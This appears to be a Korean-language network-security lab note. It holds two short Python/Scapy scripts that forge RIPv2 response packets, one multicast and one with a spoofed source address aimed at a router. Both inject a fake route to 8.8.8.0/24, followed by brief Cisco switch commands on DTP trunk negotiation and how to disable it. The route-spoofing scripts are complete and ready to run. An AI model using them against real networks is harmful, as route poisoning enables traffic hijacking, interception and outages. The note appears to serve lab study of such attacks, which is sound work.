
## kali RIP Spoofing 

cat > rip_spoofing.py

#1. 모듈 임포트<br/>
from scapy.all import *<br/>
from scapy.layers.rip import RIP, RIPEntry<br/>
<br/>
#2. RIP 멀티캐스트 전송 대상 설정<br/>
rip_ip = IP(dst="224.0.0.9")<br/>
rip_udp = UDP(sport=520, dport=520)<br/>
<br/>
#3. RIP 헤더 생성 (cmd=2: Response)<br/>
rip_header = RIP(cmd=2, version=2)<br/>
<br/>
#4. 위조된 RIP 라우팅 정보 구성<br/>
rip_entry = RIPEntry(<br/>
	AF=2,                 # IPv4<br/>
	RouteTag=0,<br/>
	addr="8.8.8.0",<br/>
	mask="255.255.255.0",<br/>
	nextHop="0.0.0.0",<br/>
	metric=1<br/>
)<br/>
<br/>
#5. RIP 패킷 조립<br/>
rip_packet = rip_ip / rip_udp / rip_header / rip_entry<br/>
<br/>
#6. RIP 패킷 전송 (iface는 공격자 NIC)<br/>
send(rip_packet, iface="eth0", count=10)<br/>

python3 rip_spoofing.py


<img width="1168" height="111" alt="image" src="https://github.com/user-attachments/assets/6153db4b-a348-4c7d-ba0e-2bfaf0b836d8" />

cat rip_spoofing2.py

from scapy.all import *<br/>
from scapy.layers.rip import RIP, RIPEntry<br/>

#RIP 패킷 생성과 각 계층별 결합을 한번에 함<br/>
pkt = (IP(dst="1.1.23.1", src="1.1.23.100", ttl=64)  # src는 R3(공격대상)와 같은 서브넷 소스처럼 위장<br/>
        / UDP(sport=520, dport=520)<br/>
        / RIP(cmd=2, version=2)<br/>
        / RIPEntry(AF=2, RouteTag=0, addr="8.8.8.0",mask="255.255.255.0", nextHop="0.0.0.0", metric=1))<br/>
<br/>
#생성된 패킷 전송<br/>
send(pkt, iface="eth0", count=5)  # 중간 라우터는 포워딩만 수행<br/>









## DTP

#### SW

conf t <br/>
int g0/0<br/>
switchport mode access (access)<br/>
switchport mode dynamic auto (dynamic auto)<br/>
switchport mode dynamic desirable (dynamic desirable)<br/>
<br/>
switchport trunk encapsulation dot1q<br/>
switchport mode trunk (trunk)<br/>


swtichport nonegotiate <- DTP 차단




























































































































